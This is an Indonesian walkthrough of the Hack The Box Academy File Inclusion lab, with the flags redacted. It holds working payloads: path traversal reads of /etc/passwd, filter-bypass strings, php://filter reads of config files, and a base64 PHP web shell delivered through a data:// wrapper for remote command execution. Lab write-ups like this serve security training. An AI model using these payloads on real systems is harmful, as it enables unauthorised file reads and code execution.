# File Inclusion
- Link modul: https://academy.hackthebox.com/module/details/23

## Local File Inclusion (LFI)
- Jalankan web target terlebih dahulu

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%201.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%202.JPG)

- **Question:** Using the file inclusion find the name of a user on the system that starts with "b".
- Vunerability berada di URL `http://ip:port/index.php?language=en.php`

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%203.JPG)

- Selanjutnya kita ganti nilai parameter `language` dengan payload file inclusion untuk membaca file `/etc/passwd`
- Akses URL berikut di browser
```sh
http://ip:port/index.php?language=../../../../etc/passwd
```

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%204.JPG)

- Ditemukan nama user barry pada file `/etc/passwd`

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%205.JPG)

- **Answer**
```sh
barry
```

- **Question:** Submit the contents of the flag.txt file located in the /usr/share/flags directory.
- Akses URL berikut di browser
```sh
http://ip:port/index.php?language=../../../../usr/share/flags/flag.txt
```

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%206.JPG)

- **Answer**
```sh
HTB{***}
```

## Basic Bypasses
- Jalankan web target terlebih dahulu

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%207.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%208.JPG)

- **Question:** The above web application employs more than one filter to avoid LFI exploitation. Try to bypass these filters to read /flag.txt
- Akses URL berikut di browser untuk mengecek vulnerability file inclusion pada web target
```sh
http://ip:port/index.php?language=languages//....//....//....//....//etc/passwd
```

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%209.JPG)

- Akses URL berikut di browser untuk membaca flag
```sh
http://ip:port/index.php?language=languages//....//....//....//....//flag.txt
```

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2010.JPG)

- **Answer**
```sh
HTB{***}
```

## PHP Filters
- Jalankan web target terlebih dahulu

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2011.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2012.JPG)

- **Question:**  Fuzz the web application for other php scripts, and then read one of the configuration files and submit the database password as the answer
- Pada task ini kita akan menggunakan wordlists dari seclists. Wordlists ini secara default belum tersedia di kali linux, jadi anda perlu menginstalasi terlebih dahulu dengan perintah sebagai berikut
```sh
sudo apt install seclists
```
- Jalankan tool `ffuf` untuk menemukan halaman yang mengandung script PHP
```sh
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://94.237.59.180:45986/FUZZ -e .php -c -ic
```

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2013.JPG)

- Ditemukan script `configure.php` pada hasil fuzzing diatas

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2014.JPG)

- Akses URL sebagai berikut pada browser untuk membuka isi file tersebut
```sh
http://ip:port/index.php?language=php://filter/read=convert.base64-encode/resource=configure
```

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2015.JPG)

- Terdapat code base64 pada halaman diatas, tekan `Ctrl+U` agar kita bisa mengcopy code base64 tersebut secara full

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2016.JPG)

- Decode code base64 diatas lewat terminal
```sh
echo 'code base64' | base64 -d
```

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2017.JPG)

- **Answer**
```sh
HTB{***}
```

## PHP Wrappers
- Jalankan web target terlebih dahulu

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2018.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2019.JPG)

- **Question:** Try to gain RCE using one of the PHP wrappers and read the flag at /
- Buka URL berikut ini, untuk membuka isi file `php.ini`
```sh
http://ip:port/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini
```

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2020.JPG)

- Tekan `Ctrl+U` untuk membuka kode sumber halaman lalu copy seluruh isi code base64

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2021.JPG)

- Tempel pada mousepad dan simpan dengan nama file `php-ini`

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2022.JPG)

- Decode melalui terminal dan cari konfigurasi `allow_url_include`
```sh
cat php-ini | base64 -d | grep 'allow_url_include'
```

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2023.JPG)

- Karena `allow_url_include = On` sekarang kita bisa buat RCE. Decode source code RCE PHP menggunakan base64
```sh
echo '<?php system($_GET["cmd"]); ?>' | base64
```

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2024.JPG)

- Copy base64 diatas lalu encode ke URL di https://www.urlencoder.org/

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2025.JPG)

- Masukkan hasil encode diatas ke dalam URL jalankan melalui web target
```sh
http://ip:port/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
```

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2026.JPG)

- Jika kita masukkan nilai parameter `cmd=ls /` maka disana terdapat file txt yang kemungkinan berisi flag

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2027.JPG)

- Sekarang coba buka isi file tersebut menggunakan perintah `cat /nama_file` melalui URL
```sh
http://ip:port/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=cat%20/nama_file
```

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2028.JPG)

- **Answer**
```sh
HTB{***}
```